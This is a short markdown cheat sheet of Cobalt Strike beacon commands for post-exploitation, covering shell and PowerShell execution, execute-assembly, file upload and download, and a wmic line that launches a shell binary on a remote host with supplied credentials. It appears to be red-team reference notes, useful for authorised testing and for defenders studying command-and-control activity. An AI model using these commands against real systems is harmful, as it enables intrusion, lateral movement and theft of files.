# 04 - Basic Commands

Search Tag: #cobalt-strike #command-and-control

## 4.1 - Navigation

`beacon> cd <directory>`

## 4.2 - Sleep and Jitter

* Set the sleep time for executing beacon commands with delay. If `sleep` is `0` it becomes interactive mode.

`beacon> sleep <seconds> <jitter>`

`beacon> sleep 30 15`

## 4.3 - List files or directories

`beacon> ls`

## 4.4 - Execute Shell Commands

* Execute any `shell` command that the beacon spawns a process `cmd.exe`

`beacon> shell <command> [args]`

`beacon> shell dir /s /b c:\ | findstr "explorer.exe"`

* Spawns a `cmd.exe` process but doesn't print the output

`beacon> execute <command> [args]`

* Spawns a child process of `powershell.exe`

`beacon> powershell <cmdlet> [args]`

* Executes unmanaged powershell command. Make sure to change the process when using the `spawnto` command

`beacon> powerpick <cmdlet> [args]`

## 4.5 - Execute Program

Execute commands without spawning `cmd.exe` except the running process comes from the beacon. This is highly recommended when you perform post exploitation activities.

`beacon> run <command> [args]`

`beacon> run arp -a`

`beacon> run wmic.exe /node:<IP> /user:<username> /password:<password> win32_process call create "C:\path\to\shell.exe"`

Run .NET binary through a temporary process when running `spawnto` beacon command otherwise it defaults back to `rundll32.dll`

`beacon> execute-assembly /path/to/compiled_dotnet_tool.exe [args]`

## 4.5 - Upload and Download Files

* Upload file

`beacon> upload /path/to/file.txt C:\path\to\upload_file.txt`

* Download file

`beacon> download C:\path\to\download_file.txt`

* Check file downloads

`beacon> downloads`

* Cancel file download(s)

`beacon> cancel <file | *>`

## 4.6 - Jobs Queue

* Queue jobs

`beacon> jobs`

* Kill job ID

`beacon> jobkill <jid>`